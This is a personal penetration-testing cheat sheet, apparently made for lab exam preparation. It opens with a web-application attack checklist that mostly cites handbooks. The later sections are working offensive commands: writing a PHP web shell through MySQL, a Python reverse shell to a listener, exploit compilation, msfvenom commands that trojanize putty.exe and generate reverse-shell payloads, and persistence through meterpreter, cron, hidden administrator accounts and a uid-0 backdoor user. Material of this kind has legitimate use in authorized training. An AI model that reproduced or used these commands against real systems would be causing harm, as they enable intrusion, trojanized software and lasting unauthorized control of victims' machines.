
## EXPLOITATION

If there are two or more of the same exploits then look for a date and try to pick the latest exploit first.

Refer to the penetration tab within the pen testing red workbook

•	Pentesting

•	Netcat

•	Msfvenom

•	Pentesting tricks part 1

•	Pentesting tricks part 2

•	Open or find the browser hackers handbook (kindle)

Refer to the web application penetration testing workbook

### THREAT MODELING

Where is the low hanging fruit, go take a walk and think about it

•	Primary target -

•	Secondary Target -

•	Tertiary targets -

### WEB APPLICATION EXPLOITATION


Hack steps

•	Analyze the application

•	Test Client side controls

•	Test Authentication Mechanisms

•	Test Session Management Mechanism

•	Test Access Controls

•	Test For input based vulnerabilities

•	Test for function-specific input vulns

•	Test for logic flaws

•	Test for shared hosting vulns

•	Test for web server vulns

•	Misc Checks

#### ATTACK SESSION MANAGEMENT

Hack Steps

•	Spider host

•	Open chapter 7 of the browser hacker handbook

•	Look for hidden logins or comments within the web app

•	Observe which items are passed to the browser after authentication

•	Find a page that is certainly session-dependent (such as a user-specific “My details” page) and make several requests for it 
systematically removing each item you suspect as being the token. If removing an item causes the page to not be returned then this may confirm that an item is a session token. See burp repeater)

#### ATTACK ACCESS CONTROLS

Hack Steps

Look for admin pages or other user access

Ask yourself

•	Do application functions give individual users access to a particular subset of data that belongs to them?

•	Are there different levels of user such as managers, supervisors, guests and so on, who are granted access to different 
functions?

•	Do administrators use functionality that is built into the same application in order to configure and monitor it?

•	What functions or data resources within the application have you identified that would most likely enable you to escalate 
your current privileges

•	Look inside the browser hacker handbook chapter 7 for attacking access controls

#### INJECTING CODE

Hack steps

•	Very broad topic and dependent upon the language

•	Inject into SQL, PHP, SOAP, LDAP

•	Supply unexpected syntax that may cause problems within the context of the particular interpreted language

•	Identify any anomalies in the applications response that may indicate the presence of a code injection vulnerability

•	If any error messages are received, examine these to obtain evidence about the problem that occurred on the server

•	If necessary systematically modify your initial input in relevant ways in an attempt to confirm or disprove your tentative 
diagnosis of a vulnerability

•	Construct a proof of concept test that causes a safe command to be executed in a verifiable way to conclusively prove that an exploitable code injection flaw exists

•	Exploit the vulnerability by leveraging the functionality of the target language and component to achieve your objections. 

•	Refer to the Web APP hacking hackers handbook inside kindle

#### PATH TRAVERSAL

Hack steps

•	Modify the parameters value to insert an arbitrary subdirectory and a single traversal sequence.

•	File=foo/file.txt

•	File=foo/bar../file1.txt

•	If the applications behavior is identical in the two cases then it may be vulnerable. You should proceed directly to 
attempting to access a different file by traversing above the start directory.

•	If the application is different than it may be blocking, stripping or sanitizing traversal sequences. 

•	Refer to the Web APP hacking hackers handbook inside kindle
•	Refer to your web app hackers workbook

#### ATTACKING APPICATION LOGIC

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to the real world logic flaws section

•	Refer to your web app hackers workbook

#### ATTACKING OTHER USERS

•	XXS

•	XSRF

•	Session Fixation

•	Exploit browser vulnerability’s

•	Try to do browser scrapper attacks

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

#### AUTOMATING WEB ATTACKS

#### ENUMERATING IDENTIFIERS / NAMES / ITEMS / DATA / RESOURCES

•	Application logic functions return messages

•	Many apps use identifiers to refer to resources
•	If sessions tokens generated by application can be predicted you may be able to hijack

o	200 - default response code meaning “ok”

o	301 or 302 - A redirection

o	401 - 403 - request not authorized or allowed

o	404 - request resource was not found

o	500 - the server encountered an error when processing the request response length

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

##### HARVESTING USEFUL DATA

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

•	Use harvesting tools

##### FUZZING FOR COMMON VULNS

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

•	Burp intruder location 7786 kindle web app hacking hackers handbook

#### EXPLOITING INFORMATION DISCLOSURE

•	Probe application for vulns, submit crafted attack, monitor the applications responses to identify error messages that may be useful

•	Gather published information

•	Chapter 14 in the web app hacking handbook

##### ATTACK COMPILED APPLICATION

•	Buffer overflow vulns

•	Integer Vulns

•	Format String Vulns

•	Review shell coders hanbook

•	Chapter 14 in the web app hacking handbook

#### ATTACK APPLICATION ARCHITECTURE

•	Tiered

•	Shared hosting and application service providers

#### ATTACKING WEB SERVER


•	Vulnerable web server configuration

•	Look for or inject a phpinfo.php page

•	Look for indexes of directorys

•	Look for vulnerable web software

•	Refer to the Web APP hacking hackers handbook inside kindle

•	Refer to your web app hackers workbook

#### WEB HACKERS TOOKIT

•	WEBBROWSERS

•	Tamper Data

•	Live HTTP Headers

•	Developers TOOLS

•	COOKIE Watchers

•	Vulnerability scanners

•	Refer to the Web APP hacking hackers handbook inside kindle

#### SQL Exploitation

REF: SQL Injection attacks and defenses

#### Try and upload a PHP shell through mysql if if you get root

Mysql > Select "<?php echo shell_exec(*dollar-sign*_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";

Once done, we can navigate to https://*IPAddress*/blogblog/wp-content/uploads/, and we should see our php shell in there.

Once inside the shell, let’s check to see if it works by appending ?cmd=ifconfig to the end of the url. This should give us a 

dirty output - but will let us know if the shell works properly.
 
WEB Shell to shell

 Nc –lvp 443

```
Shell.php?cmd=python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Reverse shell Cheat sheets

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

#### compiling

gcc compile

•	For i386 & ppc compile with the command;

•	gcc -w -o exploit exploit.c

•	For x86_64 kernel and ppc64 Compile as;

•	gcc -w -m64 -o exploit exploit.c

compile windows exploits on linux and run with wine

•	apt-get install mingw32

•	apt-get install mingw64

i586-mingw32msvc-gcc *exploit.c*

you may need to add in the winsock library to command syntax

•	i586-mingw32msvc-gcc *exploit.c* -lws2_32 -o *exploit-windows.exe*

#### other gcc commands

gcc -pthread dirty.c -o dirty -lcrypt

gcc -Wl,--hash-style=both -o exploit 9545.c

#### You may need to remove SSL

gcc apache-magika.c -o apache-magika -lssl

#### cross compiling

apt-get install mingw-w64

i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe


wine 646.exe 10.11.1.35

setup reverse listener

#### backdoor a file:

wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe

msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai 
-i 3 -b "\x00" -f exe -o puttyX.exe

#### msfvenom

msfvenom -a x64 --platform windows windows/shell_reverse_tcp LHOST=10.11.0.202 LPORT=443 -f asp -o ~/pwk_recon/mal_files/OS-
27060-64.asp

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.11.0.202 LPORT=443 -f asp -o shell.asp

msfvenom -a x86 --platform windows windows/meterpreter/reverse_tcp LHOST=10.11.0.202 LPORT=443 -f asp -o shell.asp

msfvenom -p bsd/x86/shell/reverse_tcp LHOST=10.11.0.202 LPORT=21 -f elf --platform bsd -o /var/www/bsd21rev

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=10.11.0.202 LPORT=6666 -f asp -o shell.asp

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.202 LPORT=5555 -f raw > shell.php

msfvenom -p php/reverse_php LHOST=10.11.0.202 LPORT=443 -f raw > backdoorphp1.php

msfvenom -p php/reverse_php LHOST=10.11.0.202 LPORT=8080 -f raw > backdoorphp2.php

## Persistance

### Windows Persistance

Persistance for windows

1.	run persistence -U -i 5 -p 443 -r 10.11.0.202

2.	run persistence -U -i 5 -p 666 -r 10.11.0.202

3.	set  LPORT 443

4.	exploit

or

•	create users and hide them

•	create backdoors in dll files

•	create a command hidden promt

MSF> execute -H -f cmd -i

•	Create a service account

net user Service_Account password /ADD

net localgroup administrators Service_Account /ADD

•	enable telnet service

meterpreter> run gettelnet -e

### VNC INJECT

Meterpreter VNCINJECT module

#### Linux Persistance

1.	persistance for linux
2.	use exploit/linux/local/cron_persistence
3.	set session 1
4.	set payload cmd/unix/reverse_perl
5.	set LHOST 10.11.0.202
6.	set LPORT 444
7.	run

useradd -o -u 0 hacker  -G root  -d /home/hacker -p P@ssw0rd123!  -m

#### NETCAT AS PERSISTANCE

REF: Mastering Kali Linux for Advanced penetration testing

